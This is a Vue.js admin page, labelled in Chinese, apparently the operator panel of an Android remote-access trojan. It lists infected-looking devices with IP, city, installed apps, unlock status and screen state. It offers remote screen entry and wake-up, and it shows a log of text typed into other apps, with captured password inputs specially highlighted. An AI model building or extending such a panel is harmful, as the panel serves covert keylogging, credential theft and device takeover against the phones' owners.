<template>
  <div class="mod-sys__log-operation">
    <el-form :inline="true" :model="dataForm" @keyup.enter="getDataList()">
      <el-form-item>
        <el-input v-model="dataForm.deviceId" placeholder="设备ID" clearable></el-input>
      </el-form-item>
      <el-form-item>
        <el-input v-model="dataForm.pkg" placeholder="所属包" clearable></el-input>
      </el-form-item>
      <el-form-item>
        <el-input v-model="dataForm.model" placeholder="手机型号" clearable></el-input>
      </el-form-item>
      <!-- <el-form-item>
        <el-input v-model="dataForm.phone" placeholder="手机号"></el-input>
      </el-form-item> -->

      <el-form-item>
        <el-input v-model="dataForm.language" placeholder="语言" clearable></el-input>
      </el-form-item>
      <el-form-item>
        <el-input v-model="dataForm.brand" placeholder="品牌" clearable></el-input>
      </el-form-item>

      <el-form-item>
        <el-select filterable v-model="dataForm.installApp" placeholder="已安装APP" clearable>
          <el-option v-for="app in installAppFilter" :key="app.packageName" :label="`${app.appName}(${app.packageName})`" :value="app.packageName"></el-option>
        </el-select>
      </el-form-item>

      <el-form-item>
        <el-select v-model="dataForm.status" placeholder="状态">
          <el-option label="熄屏" :value="0"></el-option>
          <el-option label="亮屏" :value="1"></el-option>
        </el-select>
      </el-form-item>

      <el-form-item>
        <el-button @click="getDataList()">{{ $t("query") }}</el-button>
      </el-form-item>
    </el-form>
    <el-table v-loading="dataListLoading" :data="dataList" border @sort-change="dataListSortChangeHandle" style="width: 100%">
      <el-table-column prop="deviceId" label="设备ID" header-align="center" align="center" show-overflow-tooltip ></el-table-column>
      <el-table-column prop="pkg" label="所属包" header-align="center" align="center" show-overflow-tooltip ></el-table-column>
      <el-table-column prop="brand" label="品牌" header-align="center" align="center" width="80px" :show-overflow-tooltip="true"></el-table-column>
      <el-table-column prop="model" label="手机型号" header-align="center" align="center" width="80px" show-overflow-tooltip></el-table-column>
      <el-table-column prop="language" label="语言" header-align="center" align="center" width="60px" show-overflow-tooltip></el-table-column>
      <el-table-column prop="systemVersion" label="系统版本" header-align="center" align="center" width="80px" show-overflow-tooltip></el-table-column>
      <el-table-column prop="sdkVersion" label="sdk版本" header-align="center" align="center" width="80px" :show-overflow-tooltip="true"></el-table-column>

      <el-table-column label="屏幕分辨率" header-align="center" align="center" width="100px" :show-overflow-tooltip="true">
        <template v-slot="scope">
          {{ `${scope.row.screenWidth}×${scope.row.screenHeight}` }}
        </template>
      </el-table-column>
      <el-table-column prop="ip" label="IP/城市" header-align="center" align="center" width="200px" :show-overflow-tooltip="true">

        <template v-slot="scope">{{ scope.row.ip }} / {{ scope.row.addr }}</template>
      </el-table-column>


      <el-table-column label="设备状态" header-align="center" align="left" width="150px">
        <template v-slot="scope">
          <div>
            可解锁
            <el-tag type="success" v-if="scope.row.lockScreen">YES</el-tag>
            <el-tag type="danger" v-else>NO</el-tag>
          </div>

           <div>
            状态
            <el-tag type="danger" v-show="scope.row.status == 0">熄屏</el-tag>
            <el-tag type="success" v-show="scope.row.status == 1">亮屏</el-tag>
            <el-tag type="info" v-show="scope.row.status == 2">等待唤醒</el-tag>
            <el-tag type="info" v-show="scope.row.status == 3">等待唤醒</el-tag>
          </div>
        </template>
      </el-table-column>

      <el-table-column prop="lastHeart" label="最后活动时间" header-align="center" align="center" width="150px" :show-overflow-tooltip="true"></el-table-column>
      <el-table-column prop="remark" label="备注" show-overflow-tooltip header-align="center" align="center" width="150px"></el-table-column>
      <el-table-column :label="$t('handle')" header-align="center" align="center" width="260px" fixed="right">
        <template v-slot="scope">
          <div class="action-buttons">
            <el-button type="primary" link @click="enterScreen(scope.row)">进入</el-button>
            <el-button type="primary" link @click="wakeup(scope.row)">唤醒</el-button>
            <el-button type="primary" link @click="showInputLog(scope.row)">输入记录</el-button>
            <el-button type="primary" link>备注</el-button>
          </div>
        </template>
      </el-table-column>
    </el-table>
    <el-pagination
      :current-page="page"
      :page-sizes="[10, 20, 50, 100]"
      :page-size="limit"
      :total="total"
      layout="total, sizes, prev, pager, next, jumper"
      @size-change="pageSizeChangeHandle"
      @current-change="pageCurrentChangeHandle"
    >
    </el-pagination>

    <DeviceDetail ref="deviceDetail" @wakeup="wakeup"></DeviceDetail>

    <!-- 输入日志弹窗 -->
    <el-dialog
      v-model="inputLogVisible"
      :title="`输入日志 - 设备ID: ${currentDevice.deviceId} 包名: ${currentDevice.pkg}`"
      width="900px"
      :close-on-click-modal="false"
      class="input-log-dialog"
    >
      <div class="log-header">
        <div class="header-row">
          <div class="query-controls">
            <span class="query-label">来源:</span>
            <el-select
              v-model="querySource"
              placeholder="选择来源"
              clearable
              style="width: 120px;"
            >
              <el-option label="管理端" :value="1" />
              <el-option label="App端" :value="0" />
            </el-select>
            <span class="query-label">APP包名:</span>
            <el-input
              v-model="queryAppPkg"
              placeholder="输入APP包名"
              clearable
              style="width: 200px;"
            />
            <span class="query-label">查询日期:</span>
            <el-date-picker
              v-model="queryDate"
              type="date"
              placeholder="选择查询日期"
              format="YYYY-MM-DD"
              value-format="YYYY-MM-DD"
              @change="onDateChange"
              style="width: 160px;"
            />
            <el-button type="primary" @click="refreshLog" :loading="logLoading" size="small">
              重新查询
            </el-button>
          </div>
        </div>
      </div>

      <div class="log-content" v-loading="logLoading">
        <div class="log-item" v-for="(item, index) in inputLogList" :key="index" :class="{ 'password-item': item.password == 1 }">
          <div class="log-content-row">
            <span class="log-time">{{ item.date || formatTime(item.time) }}</span>
            <span class="log-source" :class="{ 'source-admin': item.source == 1, 'source-app': item.source == 0 }">
              {{ item.source == 1 ? '管理端' : 'App端' }}
            </span>
            <span class="log-app">{{ item.app }}</span>
            <span class="log-resource" v-if="item.resourceId">{{ item.resourceId }}</span>
            <span class="log-text">{{ item.text || (item.password == 1 ? '[密码输入]' : '无内容') }}</span>
          </div>
        </div>
        <div v-if="inputLogList.length === 0 && !logLoading" class="no-data">
          暂无输入日志数据
        </div>
      </div>

      <template #footer>
        <el-button @click="inputLogVisible = false">关闭</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script lang="ts">
import useView from "@/hooks/useView";
import baseService from "@/service/baseService";
import DeviceDetail from "@/views/device/detail.vue";
import { defineComponent, reactive, toRefs, ref } from "vue";
import { ElMessageBox, ElMessage } from "element-plus";
export default defineComponent({
  components: {
    DeviceDetail
  },
  setup() {
    const state = reactive({
      post: true,
      getDataListURL: "/device/page",
      getDataListIsPage: true,
      installAppFilter: [],
      dataForm: {
        deviceId: "",
        pkg: "",
        phone: "",
        model: "",
        language: "",
        brand: "",
        installApp: "",
        status: ''
      }
    });
    const deviceId = ref("");
    const inputLogVisible = ref(false);
    const logLoading = ref(false);
    const inputLogList = ref([]);
    const queryDate = ref('');
    const queryAppPkg = ref('');
    const querySource = ref(null);
    const currentDevice = ref({
      deviceId: '',
      pkg: ''
    });

    return { ...useView(state), ...toRefs(state), deviceId, inputLogVisible, logLoading, inputLogList, queryDate, queryAppPkg, querySource, currentDevice };
  },
  async mounted() {
    await this.fetchInstallAppFilterList();
  },
  methods: {
    enterScreen(row: any) {
      this.deviceId = row.deviceId;
      (this.$refs as any).deviceDetail.show(row);
    },
    async fetchInstallAppFilterList() {
      let { code, data, msg } = await baseService.post("/device/installAppFilterList");
      if (code == 0) {
        this.installAppFilter = data;
      } else {
        ElMessageBox.alert(msg, "错误", {
          type: "error",
          confirmButtonText: "OK"
        });
      }
    },
    async wakeup(row: any) {
      let {code , data, msg} = await baseService.post("/device/wakeup", {
        id:row.id
      });

      if (code == 0) {
        ElMessage({
              message: "操作成功,等待唤醒!",
              type: "success"
            });
            this.getDataList();
      } else {
        ElMessageBox.alert(msg, "错误", {
          type: "error",
          confirmButtonText: "OK"
        });
      }
    },
    async showInputLog(row: any) {
      this.currentDevice.deviceId = row.deviceId;
      this.currentDevice.pkg = row.pkg; // 包名
      this.queryAppPkg = ''; // 清空APP包名输入框
      this.querySource = null; // 清空来源选择

      // 设置默认查询日期为今天
      const today = new Date();
      this.queryDate = today.getFullYear() + '-' +
        String(today.getMonth() + 1).padStart(2, '0') + '-' +
        String(today.getDate()).padStart(2, '0');

      this.inputLogVisible = true;
      this.inputLogList = [];

      // 执行查询
      await this.refreshLog();
    },
    async refreshLog() {
      if (!this.currentDevice.deviceId || !this.currentDevice.pkg || !this.queryDate) {
        ElMessage({
          message: "查询参数不完整",
          type: "warning"
        });
        return;
      }

      this.logLoading = true;
      this.inputLogList = [];

      try {
        // 根据选择的日期计算起止时间
        const selectedDate = new Date(this.queryDate);
        const startTime = new Date(selectedDate.getFullYear(), selectedDate.getMonth(), selectedDate.getDate()).getTime();
        const endTime = new Date(selectedDate.getFullYear(), selectedDate.getMonth(), selectedDate.getDate() + 1).getTime() - 1;

        const { code, data, msg } = await baseService.post("/inputTextRecord/group", {
          deviceId: this.currentDevice.deviceId,
          startTime: startTime,
          endTime: endTime,
          pkg: this.currentDevice.pkg,
          appPkg: this.queryAppPkg || undefined, // 如果有输入APP包名则传递，否则不传
          source: this.querySource !== null ? this.querySource : undefined // 如果选择了来源则传递
        });

        if (code == 0) {
          // 处理返回的数据结构：data是单个InputTextGroup对象
          if (data && data.items && Array.isArray(data.items)) {
            this.inputLogList = data.items;
          } else {
            this.inputLogList = [];
          }
        } else {
          ElMessage({
            message: msg || "获取日志失败",
            type: "error"
          });
        }
      } catch (error) {
        ElMessage({
          message: "获取日志失败",
          type: "error"
        });
      } finally {
        this.logLoading = false;
      }
    },
    onDateChange() {
      // 日期改变时可以自动查询，或者用户手动点击按钮查询
      // this.refreshLog();
    },
    formatTime(timestamp: any) {
      if (!timestamp) return '';

      const timeNum = Number(timestamp);
      if (isNaN(timeNum)) return '';

      const date = new Date(timeNum);
      if (isNaN(date.getTime())) return '';

      const year = date.getFullYear();
      const month = String(date.getMonth() + 1).padStart(2, '0');
      const day = String(date.getDate()).padStart(2, '0');
      const hours = String(date.getHours()).padStart(2, '0');
      const minutes = String(date.getMinutes()).padStart(2, '0');
      const seconds = String(date.getSeconds()).padStart(2, '0');

      return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
    }
  }
});
</script>

<style scoped>
.action-buttons {
  display: flex;
  gap: 6px;
  justify-content: center;
  align-items: center;
  flex-wrap: nowrap;
  white-space: nowrap;
}

/* 当空间不够时，按钮垂直排列 */
@media (max-width: 1200px) {
  .action-buttons {
    flex-direction: column;
    gap: 4px;
    flex-wrap: wrap;
  }
}

/* 输入日志弹窗样式 */
.input-log-dialog .el-dialog__body {
  padding: 10px 20px;
}

.log-header {
  margin-bottom: 20px;
  padding: 15px;
  background: #f5f7fa;
  border-radius: 8px;
}

.header-row {
  display: flex;
  justify-content: flex-start;
  align-items: center;
  width: 100%;
}

.query-controls {
  display: flex;
  align-items: center;
  gap: 12px;
}

.query-label {
  font-size: 14px;
  font-weight: 500;
  color: #606266;
  white-space: nowrap;
}

.log-content {
  max-height: 500px;
  overflow-y: auto;
  border: 1px solid #e4e7ed;
  border-radius: 8px;
  padding: 10px;
  background: #fafafa;
}

.log-item {
  margin-bottom: 10px;
  padding: 10px 12px;
  background: white;
  border-radius: 6px;
  border-left: 3px solid #409eff;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
}

.log-item.password-item {
  background: #fef0f0;
  border-left-color: #f56c6c;
  box-shadow: 0 2px 8px rgba(245, 108, 108, 0.2);
}

.log-item.password-item .log-text {
  background: #fde2e2;
  color: #f56c6c;
  font-weight: 500;
}

.log-content-row {
  display: flex;
  align-items: center;
  gap: 12px;
  flex-wrap: wrap;
  font-size: 13px;
}

.log-time {
  font-weight: 500;
}

.log-source {
  padding: 2px 8px;
  border-radius: 12px;
  font-size: 12px;
  font-weight: 500;
  margin-right: 8px;
}

.log-source.source-admin {
  background: #f0f9ff;
  color: #1d4ed8;
  border: 1px solid #dbeafe;
}

.log-source.source-app {
  background: #f0fdf4;
  color: #15803d;
  border: 1px solid #dcfce7;
}

.log-app {
  background: #e1f3d8;
  padding: 2px 8px;
  border-radius: 12px;
  color: #67c23a;
}

.log-resource {
  background: #e6f7ff;
  padding: 2px 8px;
  border-radius: 12px;
  color: #1890ff;
  font-size: 11px;
}

.log-text {
  font-family: 'Courier New', monospace;
  font-size: 13px;
  color: #303133;
  background: #f8f9fa;
  padding: 4px 8px;
  border-radius: 4px;
  word-break: break-all;
  flex: 1;
  min-width: 0;
}

.no-data {
  text-align: center;
  padding: 50px;
  color: #909399;
  font-size: 14px;
}
</style>
